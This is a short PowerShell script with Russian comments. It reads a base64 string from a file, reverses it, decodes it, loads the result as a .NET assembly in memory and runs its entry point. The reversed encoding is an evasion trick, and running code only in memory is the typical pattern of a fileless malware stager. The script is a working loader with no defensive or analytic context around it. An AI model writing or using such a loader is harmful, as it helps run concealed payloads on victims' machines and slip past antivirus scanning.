﻿# Путь к base64
$path = "base64.txt"

# Читаем и переворачиваем строку
$base64 = Get-Content -Path $path -Raw
$chars = $base64.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars

# Декодируем
$bytes = [Convert]::FromBase64String($fixedBase64)

# Загружаем сборку
$asm = [Reflection.Assembly]::Load($bytes)

# Получаем EntryPoint
$entry = $asm.EntryPoint
if (-not $entry) {
    Write-Host "⚠️ EntryPoint не найден"
    exit
}

# Если Main нестатический – создаём объект
$instance = if ($entry.IsStatic) { $null } else { New-Object $entry.DeclaringType }

# Определяем параметры
$paramCount = $entry.GetParameters().Count
switch ($paramCount) {
    0 {
        $argsToPass = @()                          # Main()
    }
    1 {
        $argsToPass = @( ,([string[]]@()) )        # Main(string[] args)
    }
    default {
        Write-Host "⚠️ Неожиданная сигнатура Main с $paramCount параметрами"
        exit
    }
}

# Запускаем
$entry.Invoke($instance, $argsToPass)
